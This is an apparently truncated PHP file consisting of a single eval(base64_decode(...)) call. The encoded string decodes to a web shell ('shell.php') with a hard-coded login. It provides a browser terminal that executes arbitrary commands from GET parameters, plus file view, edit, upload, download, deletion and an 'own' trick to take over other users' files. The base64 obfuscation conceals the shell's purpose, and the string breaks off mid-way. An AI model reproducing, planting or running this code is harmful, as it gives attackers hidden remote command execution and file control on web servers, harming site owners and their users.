<?php
eval(base64_decode("CiR1c2VycyA9IGFycmF5KCdhcmR1YXInPT4nNDE2OGRjYzhhYWY2Jyk7CiRob21lID0gcmVhbHBhdGgoJy4nKTsgCgpmdW5jdGlvbiBhdXRoZW50aWNhdGUoJHUpIHsKICBpZiAoIWlzc2V0KCRfU0VSVkVSWydQSFBfQVVUSF9VU0VSJ10pKSBkaWUoaGVhZGVyKCdXV1ctQXV0aGVudGljYXRlOiBCYXNpYyByZWFsbT0ic2hlbGwucGhwIicsNDAxKSk7CiAgaWYgKCFpc3NldCgkdVskX1NFUlZFUlsnUEhQX0FVVEhfVVNFUiddXSkgfHwgJHVbJF9TRVJWRVJbJ1BIUF9BVVRIX1VTRVInXV0hPSRfU0VSVkVSWydQSFBfQVVUSF9QVyddKSBkaWUoKTsKICBpZiAoJF9TRVJWRVJbJ1BIUF9BVVRIX1BXJ109PSdzZWNyZXRfcGFzc3dvcmQnKSBkaWUoJ2NoYW5nZSBkZWZhdWx0IHBhc3N3b3JkIGluIGxpbmUgMiBvZiBzaGVsbC5waHAnKTsKfQphdXRoZW50aWNhdGUoJHVzZXJzKTsKCiRjb21tYW5kcyA9IGFycmF5KCd2aWV3JywnZWRpdCcsJ3VwbG9hZCcsJ2Rvd25sb2FkJywnb3duJyk7CiRzdHlsZSA9IDw8PEVORF9PRl9TVFlMRQpib2R5IHsgbWFyZ2luOiA4cHg7IGZvbnQtZmFtaWx5Om1vbm87IGZvbnQtc2l6ZToxMnB4OyBjb2xvcjogYmxhY2s7IH0KYXsgY29sb3I6IGdyZXk7IH0KYTpob3ZlcnsgY29sb3I6IGJsdWU7IH0KYS5jb3B5eyBjb2xvcjogYmxhY2s7IHRleHQtZGVjb3JhdGlvbjpub25lOyB9CkVORF9PRl9TVFlMRTsKJG1pY3JvQWpheCA9IDw8PEVORF9PRl9KQVZBU0NSSVBUCmZ1bmN0aW9uIG1pY3JvQWpheChCLEEpe3RoaXMuYmluZEZ1bmN0aW9uPWZ1bmN0aW9uKEUsRCl7cmV0dXJuIGZ1bmN0aW9uKCl7cmV0dXJuIEUuYXBwbHkoRCxbRF0pfX07dGhpcy5zdGF0ZUNoYW5nZT1mdW5jdGlvbihEKXtpZih0aGlzLnJlcXVlc3QucmVhZHlTdGF0ZT09NCl7dGhpcy5jYWxsYmFja0Z1bmN0aW9uKHRoaXMucmVxdWVzdC5yZXNwb25zZVRleHQpfX07dGhpcy5nZXRSZXF1ZXN0PWZ1bmN0aW9uKCl7aWYod2luZG93LkFjdGl2ZVhPYmplY3Qpe3JldHVybiBuZXcgQWN0aXZlWE9iamVjdCgiTWljcm9zb2Z0LlhNTEhUVFAiKX1lbHNle2lmKHdpbmRvdy5YTUxIdHRwUmVxdWVzdCl7cmV0dXJuIG5ldyBYTUxIdHRwUmVxdWVzdCgpfX1yZXR1cm4gZmFsc2V9O3RoaXMucG9zdEJvZHk9KGFyZ3VtZW50c1syXXx8IiIpO3RoaXMuY2FsbGJhY2tGdW5jdGlvbj1BO3RoaXMudXJsPUI7dGhpcy5yZXF1ZXN0PXRoaXMuZ2V0UmVxdWVzdCgpO2lmKHRoaXMucmVxdWVzdCl7dmFyIEM9dGhpcy5yZXF1ZXN0O0Mub25yZWFkeXN0YXRlY2hhbmdlPXRoaXMuYmluZEZ1bmN0aW9uKHRoaXMuc3RhdGVDaGFuZ2UsdGhpcyk7aWYodGhpcy5wb3N0Qm9keSE9PSIiKXtDLm9wZW4oIlBPU1QiLEIsdHJ1ZSk7Qy5zZXRSZXF1ZXN0SGVhZGVyKCJYLVJlcXVlc3RlZC1XaXRoIiwiWE1MSHR0cFJlcXVlc3QiKTtDLnNldFJlcXVlc3RIZWFkZXIoIkNvbnRlbnQtdHlwZSIsImFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCIpO0Muc2V0UmVxdWVzdEhlYWRlcigiQ29ubmVjdGlvbiIsImNsb3NlIil9ZWxzZXtDLm9wZW4oIkdFVCIsQix0cnVlKX1DLnNlbmQodGhpcy5wb3N0Qm9keSl9fTsKRU5EX09GX0pBVkFTQ1JJUFQ7CgpmdW5jdGlvbiBiYXNoKCkKeyBnbG9iYWwgJGhvbWU7CiAgZ2xvYmFsICRhOwogIGdsb2JhbCAkY29tbWFuZHM7CiAgZ2xvYmFsICRzdHlsZTsKICBnbG9iYWwgJG1pY3JvQWpheDsKICBpZiAoc3RydG91cHBlcihzdWJzdHIoUEhQX09TLCAwLCAzKSkgPT09ICdXSU4nKSBkaWUoJ1dpbmRvd3Mgbm90IHN1cHBvcnRlZCcpOwogICRqc29uQ29tbWFuZHMgPSBqc29uX2VuY29kZSgkY29tbWFuZHMpOwogICRzdWdnZXN0aW9ucyA9IGxpbmtzKGFycmF5KCdjZCBcJ35cJyc9PidjZCBcJ35cJycsJ3VwbG9hZCc9Pid1cGxvYWQnKSk7CiAgJHByb2Nlc3NVc2VyID0gcG9zaXhfZ2V0cHd1aWQocG9zaXhfZ2V0ZXVpZCgpKTsKICAkcHJvbXB0ID0gJzxzcGFuIGlkPSJwcm9tcHQiPicuJHByb2Nlc3NVc2VyWyduYW1lJ10uJ0AnLnBocF91bmFtZSgnbicpLic6PHNwYW4gaWQ9ImRpciI+fjwvc3Bhbj4kIDwvc3Bhbj4nOwogIGVjaG8gPDw8RU5EX09GX0hUTUwKPGh0bWw+PGhlYWQ+CjxzdHlsZT4KJHN0eWxlCjwvc3R5bGU+CjxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0Ij4KJG1pY3JvQWpheAp2YXIgbHMgPSAnbHMgLWFsJzsKZnVuY3Rpb24gZm9jdXMoKQp7IGRvY3VtZW50LmZvcm1zWzBdLmVsZW1lbnRzWzBdLmZvY3VzKCk7CiAgd2luZG93LnNjcm9sbFRvKDAsZG9jdW1lbnQuZm9ybXNbMF0uZWxlbWVudHNbMF0ub2Zmc2V0VG9wKTsgIAp9CmZ1bmN0aW9uIG9uZGF0YShzdHIpCnsgdmFyIGNvbW1hbmQgPSBkb2N1bWVudC5mb3Jtc1swXS5lbGVtZW50c1swXS52YWx1ZTsKICBldmFsKCd2YXIgZGF0YSA9ICcrc3RyKTsKICB0ZXh0ID0gZGF0YS5vdXRwdXQ7CiAgdmFyIG5ld1RleHQgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzcGFuJyk7CiAgbmV3VGV4dC5pbm5lckhUTUwgPSB0ZXh0OwogIHZhciBoaXN0b3J5ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2hpc3RvcnknKTsKICB2YXIgaXNjZCA9IHRleHQuc3BsaXQoIlxcbiIpWzBdLmluZGV4T2YoJ1wkIGNkICcpPj0wOwogIGlmIChpc2NkKSBoaXN0b3J5LmlubmVySFRNTD0iIjsKICBoaXN0b3J5LmFwcGVuZENoaWxkKG5ld1RleHQpOwogIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdkaXInKS5pbm5lckhUTUw9ZGF0YS5kaXI7CiAgZG9jdW1lbnQuZm9ybXNbMF0uZWxlbWVudHNbMF0udmFsdWUgPSAiIjsKICBmb2N1cygpOwogIGlmIChpc2NkKQogIHsgZG9jdW1lbnQuZm9ybXNbMF0uZWxlbWVudHNbMF0udmFsdWUgPSBsczsKICAgIG9uZW50ZXIoKTsKICB9Cn0KZnVuY3Rpb24gYWN0aXZhdGUoYSkKeyBkb2N1bWVudC5mb3Jtc1swXS5lbGVtZW50c1swXS52YWx1ZSA9IGEudGl0bGU7CiAgb25lbnRlcigpOwogIHJldHVybiBmYWxzZTsKfQpmdW5jdGlvbiBjb3B5KGEpCnsgdmFyIHMgPSBkb2N1bWVudC5mb3Jtc1swXS5lbGVtZW50c1swXS52YWx1ZTsKICBpZiAocy5sZW5ndGggJiYgcy5zdWJzdHIocy5sZW5ndGgtMSwxKSE9JyAnKSBzKz0nICc7CiAgZG9jdW1lbnQuZm9ybXNbMF0uZWxlbWVudHNbMF0udmFsdWUgPSBzK2EudGl0bGUrJyAnOwogIHJldHVybiBmYWxzZTsKfQpmdW5jdGlvbiBvbmVudGVyKCkKeyB2YXIgY29tbWFuZCA9IGRvY3VtZW50LmZvcm1zWzBdLmVsZW1lbnRzWzBdLnZhbHVlOwogIGlmIChjb21tYW5kLnN1YnN0cigwLDQpPT0nbHMgLScpIGxzID0gY29tbWFuZDsKICB2YXIgZGlyID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2RpcicpLmlubmVySFRNTDsKICB2YXIgcmVhbCA9IGRpci5yZXBsYWNlKC9efi8sJyRob21lJyk7CiAgdmFyIGNvbW1hbmRzID0gJGpzb25Db21tYW5kczsKICBpZiAoY29tbWFuZD09J2NsZWFyJyB8fCBjb21tYW5kPT0nZXhpdCcpIAogIHsgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2hpc3RvcnknKS5pbm5lckhUTUw9IiI7CiAgICBkb2N1bWVudC5mb3Jtc1swXS5lbGVtZW50c1swXS52YWx1ZSA9ICIiOwogICAgcmV0dXJuIGZhbHNlOwogIH0KICBmb3IgKHZhciBjIGluIGNvbW1hbmRzKQogIHsgYyA9IGNvbW1hbmRzW2NdOwogICAgdmFyIGVudGVyZWQgPSBjb21tYW5kLnN1YnN0cigwLGMubGVuZ3RoKzEpCiAgICBpZiAoZW50ZXJlZD09YyB8fCBlbnRlcmVkPT1jKycgJykKICAgIHsgdmFyIG5ld1RleHQgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzcGFuJyk7CiAgICAgIHZhciBwcm9tcHQgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncHJvbXB0Jyk7CiAgICAgIG5ld1RleHQuaW5uZXJIVE1MID0gKHByb21wdC50ZXh0Q29udGVudHx8cHJvbXB0LmlubmVyVGV4dCkrY29tbWFuZCsiXFxuIjsKICAgICAgdmFyIGhpc3RvcnkgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnaGlzdG9yeScpOwogICAgICBoaXN0b3J5LmFwcGVuZENoaWxkKG5ld1RleHQpOwogICAgICBkb2N1bWVudC5mb3Jtc1swXS5lbGVtZW50c1swXS52YWx1ZSA9ICIiOwogICAgICB2YXIgYXBwbGljYXRpb24gPSBlbmNvZGVVUklDb21wb25lbnQoYyk7CiAgICAgIHZhciBhcmd1bWVudCA9IGNvbW1hbmQuc3Vic3RyKGMubGVuZ3RoKzEpOwogICAgICBhcmd1bWVudCA9IGFyZ3VtZW50LnJlcGxhY2UoL14oJyguKiknKXwoW14nXS4qKSQvLCckMiQzJyk7CiAgICAgIGFyZ3VtZW50ID0gZW5jb2RlVVJJQ29tcG9uZW50KGFyZ3VtZW50KTsKICAgICAgcmVhbCA9IGVuY29kZVVSSUNvbXBvbmVudChyZWFsKTsKICAgICAgZG9jdW1lbnQubG9jYXRpb24gPSAnP2FwcGxpY2F0aW9uPScrYXBwbGljYXRpb24rJyZkaXJlY3Rvcnk9JytyZWFsKycmYXJndW1lbnQ9Jythcmd1bWVudDsKICAgICAgcmV0dXJuIGZhbHNlOwogICAgfQogIH0KICBjb21tYW5kID0gZW5jb2RlVVJJQ29tcG9uZW50KGNvbW1hbmQpOwogIGRpciA9IGVuY29kZVVSSUNvbXBvbmVudChkaXIpOwogIG1pY3JvQWpheCgnP2FwcGxpY2F0aW9uPWNvbW1hbmQmY29tbWFuZD0nK2NvbW1hbmQrJyZkaXI9JytkaXIsIG9uZGF0YSk7CiAgcmV0dXJuIGZhbHNlOwp9CmRvY3VtZW50Lm9ua2V5cHJlc3MgPSBmdW5jdGlvbiBkb1NvbWV0aGluZyhlKSB7Cgl2YXIgY29kZTsKCWlmICghZSkgdmFyIGUgPSB3aW5kb3cuZXZlbnQ7CglpZiAoZS50YXJnZXQ9PWRvY3VtZW50LmZvcm1zWzBdLmVsZW1lbnRzWzBdKSByZXR1cm47CglpZiAoZS5rZXlDb2RlKSBjb2RlID0gZS5rZXlDb2RlOwoJZWxzZSBpZiAoZS53aGljaCkgY29kZSA9IGUud2hpY2g7Cgl2YXIgY2hhcmFjdGVyID0gU3RyaW5nLmZyb21DaGFyQ29kZShjb2RlKTsKCWRvY3VtZW50LmZvcm1zWzBdLmVsZW1lbnRzWzBdLnZhbHVlKz1jaGFyYWN0ZXI7Cglmb2N1cygpOwp9Cjwvc2NyaXB0PjwvaGVhZD48Ym9keSBzdHlsZT0ibWFyZ2luOjhweDsiIG9ubG9hZD0iZG9jdW1lbnQuZm9ybXNbMF0uZWxlbWVudHNbMF0udmFsdWUgPSBsczsgb25lbnRlcigpOyI+CjxwcmUgaWQ9Imhpc3RvcnkiIHN0eWxlPSJkaXNwbGF5OmlubGluZTtwYWRkaW5nOjA7bWFyZ2luOjA7Ij4KPC9wcmU+PHByZSBzdHlsZT0iZGlzcGxheTppbmxpbmU7cGFkZGluZzowO21hcmdpbjowOyI+Cjxmb3JtIHN0eWxlPSJkaXNwbGF5OmlubGluZTsgcGFkZGluZzowOyBtYXJnaW46MDsiIG9uc3VibWl0PSJyZXR1cm4gb25lbnRlcigpOyI+JHByb21wdDxpbnB1dCBzdHlsZT0iZm9udC1mYW1pbHk6bW9ubzsgZm9udC1zaXplOjEycHg7IGNvbG9yOiBibGFjazsgcGFkZGluZzowOyBtYXJnaW46MDsgYm9yZGVyOjA7IHdpZHRoOjQwZW07IiB0eXBlPSJ0ZXh0IiBuYW1lPSJjb21tYW5kIiBhdXRvY29tcGxldGU9Im9mZiJcPjwvZm9ybT4KPGRpdj4kc3VnZ2VzdGlvbnM8L2Rpdj4KPC9ib2R5PjwvaHRtbD4KRU5EX09GX0hUTUw7Cn0KCmZ1bmN0aW9uIGV4cGFuZCgkaG9tZSwkZGlyLCRwYXRoKQp7IHByZWdfbWF0Y2goJy9eKH4/KShcLz8pKC4qKSQvJywkcGF0aCwkbWF0Y2hlcyk7CiAgaWYgKCRtYXRjaGVzWzFdKSBAJG5ld2RpciA9ICRob21lLiRtYXRjaGVzWzJdLiRtYXRjaGVzWzNdOwogIGVsc2UgaWYgKCRtYXRjaGVzWzJdKSBAJG5ld2RpciA9ICRtYXRjaGVzWzJdLiRtYXRjaGVzWzNdOwogIGVsc2UgQCRuZXdkaXIgPSAkZGlyLicvJy4kbWF0Y2hlc1szXTsKICBpZiAoZmlsZV9leGlzdHMoJG5ld2RpcikpIHJldHVybiByZWFscGF0aCgkbmV3ZGlyKTsKICByZXR1cm4gJG5ld2RpcjsKfQoKZnVuY3Rpb24gYWx0X3N0YXQoJGZpbGUpCnsgY2xlYXJzdGF0Y2FjaGUoKTsKICAkc3M9QHN0YXQoJGZpbGUpOwogIGlmKCEkc3MpIHJldHVybiBmYWxzZTsgLy9Db3VsZG50IHN0YXQgZmlsZQoKICAkdHM9YXJyYXkoCiAgMDE0MDAwMD0+J3Nzb2NrZXQnLAogIDAxMjAwMDA9PidsbGluaycsCiAgMDEwMDAwMD0+Jy1maWxlJywKICAwMDYwMDAwPT4nYmJsb2NrJywKICAwMDQwMDAwPT4nZGRpcicsCiAgMDAyMDAwMD0+J2NjaGFyJywKICAwMDEwMDAwPT4ncGZpZm8nLAogICk7CgogICRwPSRzc1snbW9kZSddOwogICR0PWRlY29jdCgkc3NbJ21vZGUnXSAmIDAxNzAwMDApOyAvLyBGaWxlIEVuY29kaW5nIEJpdAoKICAkc3RyID0oYXJyYXlfa2V5X2V4aXN0cyhvY3RkZWMoJHQpLCR0cykpPyR0c1tvY3RkZWMoJHQpXXswfTondSc7CiAgJHN0ci49KCgkcCYweDAxMDApPydyJzonLScpLigoJHAmMHgwMDgwKT8ndyc6Jy0nKTsKICAkc3RyLj0oKCRwJjB4MDA0MCk/KCgkcCYweDA4MDApPydzJzoneCcpOigoJHAmMHgwODAwKT8nUyc6Jy0nKSk7CiAgJHN0ci49KCgkcCYweDAwMjApPydyJzonLScpLigoJHAmMHgwMDEwKT8ndyc6Jy0nKTsKICAkc3RyLj0oKCRwJjB4MDAwOCk/KCgkcCYweDA0MDApPydzJzoneCcpOigoJHAmMHgwNDAwKT8nUyc6Jy0nKSk7CiAgJHN0ci49KCgkcCYweDAwMDQpPydyJzonLScpLigoJHAmMHgwMDAyKT8ndyc6Jy0nKTsKICAkc3RyLj0oKCRwJjB4MDAwMSk/KCgkcCYweDAyMDApPyd0JzoneCcpOigoJHAmMHgwMjAwKT8nVCc6Jy0nKSk7CgogICR0eXBlID0gc3Vic3RyKCR0c1tvY3RkZWMoJHQpXSwxKTsKICAkb3duZXIgPSBwb3NpeF9nZXRwd3VpZCgkc3NbJ3VpZCddKTsKICAkZ3JvdXAgPSBwb3NpeF9nZXRncmdpZCgkc3NbJ2dpZCddKTsKCiAgJHM9YXJyYXkoCiAgJ2h1bWFuJz0+JHN0ciwKICAnb3duZXInPT4kb3duZXJbJ25hbWUnXSwKICAnZ3JvdXAnPT4kZ3JvdXBbJ25hbWUnXSwKICAncmVhbHBhdGgnPT5AcmVhbHBhdGgoJGZpbGUpLAogICdkaXJuYW1lJz0+QGRpcm5hbWUoJGZpbGUpLAogICdiYXNlbmFtZSc9PkBiYXNlbmFtZSgkZmlsZSksCiAgJ3R5cGUnPT4kdHlwZSwKICAndHlwZV9vY3RhbCc9PnNwcmludGYoIiUwN28iLCBvY3RkZWMoJHQpKSwKICAnaXNfZmlsZSc9PkBpc19maWxlKCRmaWxlKSwKICAnaXNfZGlyJz0+QGlzX2RpcigkZmlsZSksCiAgJ2lzX2xpbmsnPT5AaXNfbGluaygkZmlsZSksCiAgJ2lzX3JlYWRhYmxlJz0+IEBpc19yZWFkYWJsZSgkZmlsZSksCiAgJ2lzX3dyaXRhYmxlJz0+IEBpc193cml0YWJsZSgkZmlsZSksCiAgJ2RldmljZSc9PiRzc1snZGV2J10sIC8vRGV2aWNlCiAgJ2RldmljZV9udW1iZXInPT4kc3NbJ3JkZXYnXSwgLy9EZXZpY2UgbnVtYmVyLCBpZiBkZXZpY2UuCiAgJ2lub2RlJz0+JHNzWydpbm8nXSwgLy9GaWxlIHNlcmlhbCBudW1iZXIKICAnbGlua19jb3VudCc9PiRzc1snbmxpbmsnXSwgLy9saW5rIGNvdW50CiAgJ2xpbmtfdG8nPT4oJHR5cGU9PSdsaW5rJykgPyBAcmVhZGxpbmsoJGZpbGUpIDogJycsCiAgJ3NpemUnPT4kc3NbJ3NpemUnXSwgLy9TaXplIG9mIGZpbGUsIGluIGJ5dGVzLgogICdibG9ja3MnPT4kc3NbJ2Jsb2NrcyddLCAvL051bWJlciA1MTItYnl0ZSBibG9ja3MgYWxsb2NhdGVkCiAgJ2Jsb2NrX3NpemUnPT4gJHNzWydibGtzaXplJ10sIC8vT3B0aW1hbCBibG9jayBzaXplIGZvciBJL08uCiAgJ2FjY2Vzc2VkJz0+QGRhdGUoJ1ktbS1kIEg6aScsJHNzWydhdGltZSddKSwKICAnbW9kaWZpZWQnPT5AZGF0ZSgnWS1tLWQgSDppJywkc3NbJ210aW1lJ10pLAogICdjcmVhdGVkJz0+QGRhdGUoJ1ktbS1kIEg6aScsJHNzWydjdGltZSddKSwKICApOwoKICBjbGVhcnN0YXRjYWNoZSgpOwogIHJldHVybiAkczsKfQoKZnVuY3Rpb24gbGlua3MoJGNvbW1hbmRzKQp7ICRvdXRwdXQgPSAnJzsKICBmb3JlYWNoICgkY29tbWFuZHMgYXMgJHRleHQ9PiRocmVmKQogIHsgJGggPSBhZGRzbGFzaGVzKCRocmVmKTsKICAgIGlmICgkdGV4dD09J3JtJykgJG91dHB1dC49ICI8YSBocmVmPVwiI1wiIHRpdGxlPVwiJGhyZWZcIiBvbmNsaWNrPVwiaWYgKGNvbmZpcm0oJ1lvdSBhcmUgYWJvdXQgdG86XFxuXFxuJGhcXG5cXG5BcmUgeW91IHN1cmU/JykpIGFjdGl2YXRlKHRoaXMpOyByZXR1cm4gZmFsc2VcIj4kdGV4dDwvYT4gIjsKICAgIGVsc2UgJG91dHB1dC49ICI8YSBocmVmPVwiI1wiIHRpdGxlPVwiJGhyZWZcIiBvbmNsaWNrPVwicmV0dXJuIGFjdGl2YXRlKHRoaXMpO1wiPiR0ZXh0PC9hPiAiOwogIH0KICByZXR1cm4gJG91dHB1dDsKfQoKZnVuY3Rpb24gYWN0aW9uKCRzZGlyLCRzKQp7ICRjb21tYW5kcyA9IGFycmF5KCk7CiAgJHVzZXIgPSBwb3NpeF9nZXRwd3VpZChwb3NpeF9nZXR1aWQoKSk7CiAgJHVzZXJuYW1lID0gJHVzZXJbJ25hbWUnXTsKICBpZiAoJHNbJ2lzX2RpciddKQogIHsgJGIgPSBlc2NhcGVzaGVsbGFyZygkc1snYmFzZW5hbWUnXSk7CiAgICBpZiAoJHNbJ2lzX3JlYWRhYmxlJ10pCiAgICB7ICRjb21tYW5kc1snY2QnXSA9ICJjZCAkYiI7CiAgICB9CiAgICBpZiAoJHNbJ2lzX3dyaXRhYmxlJ10pCiAgICB7IGlmICgkc1snYmFzZW5hbWUnXT09Jy4nKQogICAgICB7ICRyID0gZXNjYXBlc2hlbGxhcmcoYmFzZW5hbWUoJHNbJ3JlYWxwYXRoJ10uJ18nLmRhdGUoJ1ltZEhpJykuJy56aXAnKSk7CiAgICAgICAgJGQgPSBlc2NhcGVzaGVsbGFyZygnLicpOwogICAgICAgICRjb21tYW5kc1snemlwJ10gPSAiemlwIC1yICRyICRkIjsKICAgICAgfQogICAgICBpZiAoJHNbJ2Jhc2VuYW1lJ10hPScuJyAmJiAkc1snYmFzZW5hbWUnXSE9Jy4uJykKICAgICAgeyAkY29tbWFuZHNbJ3JtJ10gPSAicm0gLVIgJGIiOwogICAgICB9CiAgICB9CiAgfQogIGVsc2UgaWYgKCRzWydpc19maWxlJ10pCiAgeyAkdCA9IGVzY2FwZXNoZWxsYXJnKCRzWydiYXNlbmFtZSddLicudG1wJyk7CiAgICAkYiA9IGVzY2FwZXNoZWxsYXJnKCRzWydiYXNlbmFtZSddKTsKICAgIGlmICgkc1snaXNfcmVhZGFibGUnXSkKICAgIHsgJGNvbW1hbmRzWyd2aWV3J10gPSAidmlldyAkYiI7CiAgICAgICRjb21tYW5kc1snZG93bmxvYWQnXSA9ICJkb3dubG9hZCAkYiI7CiAgICB9CiAgICBpZiAoJHNbJ2lzX3dyaXRhYmxlJ10pCiAgICB7ICRjb21tYW5kc1snZWRpdCddID0gImVkaXQgJGIiOwogICAgfQogICAgaWYgKCRzZGlyWydpc193cml0YWJsZSddKQogICAgeyBpZiAoJHNbJ293bmVyJ10hPSR1c2VybmFtZSkKICAgICAgeyAkY29tbWFuZHNbJ293biddID0gIm12ICRiICR0OyBjcCAkdCAkYjsgcm0gJHQiOwogICAgICB9CiAgICAgICRjb21tYW5kc1sncm0nXSA9ICJybSAkYiI7CiAgICAgIGlmIChwcmVnX21hdGNoKCcvXiguKilcLnppcCQvJywkc1snYmFzZW5hbWUnXSwkbWF0Y2hlcykpCiAgICAgIHsgJGQgPSBlc2NhcGVzaGVsbGFyZygkbWF0Y2hlc1sxXSk7CiAgICAgICAgJGNvbW1hbmRzWyd1bnppcCddID0gInVuemlwICRiIC1kICRkIjsKICAgICAgfQogICAgfQogIH0KICByZXR1cm4gbGlua3MoJGNvbW1hbmRzKTsKfQoKZnVuY3Rpb24gbHMoJGZsYWdzLCRkaXIpCnsgJGZpbGVzID0gc2NhbmRpcigkZGlyKTsKICAkZGF0YSA9IGFycmF5KCk7CiAgJGFsbCA9IHN0cnBvcygkZmxhZ3MsJ2EnKSE9PWZhbHNlOwogIGlmIChzdHJwb3MoJGZsYWdzLCdsJyk9PT1mYWxzZSkgJGNvbHVtbnMgPSBhcnJheSgnYmFzZW5hbWUnPT4nbCcsJ2FjdGlvbic9PicnKTsKICBlbHNlICRjb2x1bW5zID0gYXJyYXkoJ2h1bWFuJz0+J2wnLCdsaW5rX2NvdW50Jz0+J3InLCdvd25lcic9PidsJywnZ3JvdXAnPT4nbCcsJ3NpemUnPT4ncicsJ21vZGlmaWVkJz0+J2wnLCdiYXNlbmFtZSc9PidsJywnYWN0aW9uJz0+JycpOwogIGZvcmVhY2ggKGFycmF5X2tleXMoJGNvbHVtbnMpIGFzICRjb2x1bW4pICRkYXRhWyRjb2x1bW5dID0gYXJyYXkoKTsKICAkc2RpciA9IGFsdF9zdGF0KCRkaXIpOwogIGZvcmVhY2goJGZpbGVzIGFzICRmaWxlKSAKICB7IGlmIChzdWJzdHIoJGZpbGUsMCwxKT09Jy4nICYmICEkYWxsKSBjb250aW51ZTsKICAgICRzID0gYWx0X3N0YXQoJGRpci4nLycuJGZpbGUpOwogICAgZm9yZWFjaCAoJGNvbHVtbnMgYXMgJGNvbHVtbj0+JGFsaWduKQogICAgeyBpZiAoJGNvbHVtbiAhPSAnYWN0aW9uJykgJGRhdGFbJGNvbHVtbl1bXSA9ICRzWyRjb2x1bW5dOwogICAgICBlbHNlICRkYXRhWyRjb2x1bW5dW10gPSBhY3Rpb24oJHNkaXIsJHMpOwogICAgfQogIH0KICAkb3V0cHV0PScnOwogICRsZW5ndGhzID0gYXJyYXkoKTsKICBmb3JlYWNoICgkY29sdW1ucyBhcyAkY29sdW1uPT4kYWxpZ24pCiAgeyAkbGVuZ3RoWyRjb2x1bW5dPTA7CiAgICBmb3JlYWNoICgkZGF0YVskY29sdW1uXSBhcyAkcykKICAgIHsgJGxlbmd0aFskY29sdW1uXT1tYXgoJGxlbmd0aFskY29sdW1uXSxzdHJsZW4oJHMpKTsKICAgIH0KICB9CiAgJHJtYXggPSBjb3VudCgkZGF0YVskY29sdW1uXSk7CiAgZm9yICgkcj0wOyRyPCRybWF4OyRyKyspCiAgeyBmb3JlYWNoICgkY29sdW1ucyBhcyAkY29sdW1uPT4kYWxpZ24pCiAgICB7ICRkID0gJGRhdGFbJGNvbHVtbl1bJHJdOwogICAgICBpZiAoJGFsaWduPT0nbCcpICRkID0gc3RyX3BhZCgkZCwgJGxlbmd0aFskY29sdW1uXSwgIiAiLCBTVFJfUEFEX1JJR0hUKTsKICAgICAgaWYgKCRhbGlnbj09J3InKSAkZCA9IHN0cl9wYWQoJGQsICRsZW5ndGhbJGNvbHVtbl0sICIgIiwgU1RSX1BBRF9MRUZUKTsKICAgICAgaWYgKCRhbGlnbj09J2MnKSAkZCA9IHN0cl9wYWQoJGQsICRsZW5ndGhbJGNvbHVtbl0sICIgIiwgU1RSX1BBRF9CT1RIKTsKICAgICAgaWYgKCRjb2x1bW49PSdiYXNlbmFtZScpICRvdXRwdXQuPSAnPGEgaHJlZj0iIyIgY2xhc3M9ImNvcHkiIG9uY2xpY2s9InJldHVybiBjb3B5KHRoaXMpOyIgdGl0bGU9IicuZXNjYXBlc2hlbGxhcmcoJGRhdGFbJGNvbHVtbl1bJHJdKS4nIj4nLiRkLic8L2E+ICc7CiAgICAgIGVsc2UgJG91dHB1dC49ICRkLicgJzsKICAgIH0KICAgICRvdXRwdXQuPSAiXG4iOwogIH0KICByZXR1cm4gJG91dHB1dDsKfQoKZnVuY3Rpb24gY29tbWFuZCgpCnsgZ2xvYmFsICRob21lOwogICRjb21tYW5kID0gZmFsc2U7CiAgJGRpciA9ICRob21lOwogICRvdXRwdXQgPSBmYWxzZTsKICAkcHJvY2Vzc1VzZXIgPSBwb3NpeF9nZXRwd3VpZChwb3NpeF9nZXRldWlkKCkpOwogICRwcm9tcHQgPSAnPHNwYW4gaWQ9InByb21wdCI+Jy4kcHJvY2Vzc1VzZXJbJ25hbWUnXS4nQCcucGhwX3VuYW1lKCduJykuJzo8c3BhbiBpZD0iZGlyIj5+PC9zcGFuPiQgPC9zcGFuPic7CiAgaWYgKGlzc2V0KCRfR0VUWydjb21tYW5kJ10pKSAkY29tbWFuZCA9ICRfR0VUWydjb21tYW5kJ107CiAgaWYgKGlzc2V0KCRfR0VUWydkaXInXSkpICRkaXIgPSAkX0dFVFsnZGlyJ107CiAgJG9sZGRpciA9ICRkaXI7CiAgaWYgKHN1YnN0cigkZGlyLDAsMSk9PSd+JykgJGRpciA9ICRob21lLnN1YnN0cigkZGlyLDEpOwogIGhlYWRlcignQ29udGVudC1UeXBlOiB0ZXh0L3BsYWluJyk7CiAgJG91dHB1dCA9ICcnOwogIGlmIChwcmVnX21hdGNoKCcvXmNkICguKikkLycsdHJpbSgkY29tbWFuZCksJG1hdGNoZXMpKQogIHsgJGFyZ3VtZW50ID0gJG1hdGNoZXNbMV07CiAgICAkcmVhbCA9IGZhbHNlOwogICAgaWYgKHByZWdfbWF0Y2goJy9eXCcoLiopXCd8KFteXCddLiopJC8nLCRhcmd1bWVudCwkbWF0Y2hlcykpCiAgICB7IGlmIChpc3NldCgkbWF0Y2hlc1sxXSkpICRhcmd1bWVudCA9ICRtYXRjaGVzWzFdOwogICAgICBpZiAoaXNzZXQoJG1hdGNoZXNbMl0pKSAkYXJndW1lbnQgPSAkbWF0Y2hlc1syXTsKICAgICAgJHJlYWwgPSBleHBhbmQoJGhvbWUsJGRpciwkYXJndW1lbnQpOwogICAgfQogICAgaWYgKCEkYXJndW1lbnQgfHwgISRyZWFsIHx8ICFmaWxlX2V4aXN0cygkcmVhbCkpCiAgICB7ICRvdXRwdXQuPSJiYXNoOiAkY29tbWFuZDogTm8gc3VjaCBmaWxlIG9yIGRpcmVjdG9yeVxuIjsKICAgIH0KICAgIGVsc2UgaWYgKCFpc19yZWFkYWJsZSgkcmVhbCkpCiAgICB7ICRvdXRwdXQuPSJiYXNoOiAkY29tbWFuZDogY2FuJ3QgY2QgdG8gZGlyZWN0b3J5XG4iOwogICAgfQogICAgZWxzZQogICAgeyAkZGlyID0gJHJlYWw7CiAgICB9CiAgfQogIGVsc2UgaWYgKHByZWdfbWF0Y2goJy9ebHMoIC1bYS16QS1aMC05XSs